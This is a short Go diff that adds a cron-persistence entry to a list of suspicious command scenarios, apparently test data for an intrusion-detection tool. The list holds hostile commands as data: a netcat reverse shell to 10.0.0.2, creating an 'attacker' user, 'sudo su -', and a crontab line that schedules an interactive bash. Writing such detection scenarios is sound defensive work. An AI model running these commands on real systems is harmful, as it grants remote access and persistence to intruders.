@@ -40,6 +40,7 @@ var suspiciousScenarios = []Scenario{
 	{Name: "Reverse Shell", Command: "nc", FullCommand: "nc -e /bin/bash 10.0.0.2", UID: 1000},
 	{Name: "User Creation", Command: "useradd", FullCommand: "useradd attacker", UID: 0},
 	{Name: "Privilege Escalation", Command: "sudo", FullCommand: "sudo su -", UID: 1000},
+	{Name: "Persistence via Cron", Command: "crontab", FullCommand: "crontab -l | { cat; echo \"* * * * * /bin/bash -i\"; } | crontab -", UID: 1000},
 }
 
 func main() {
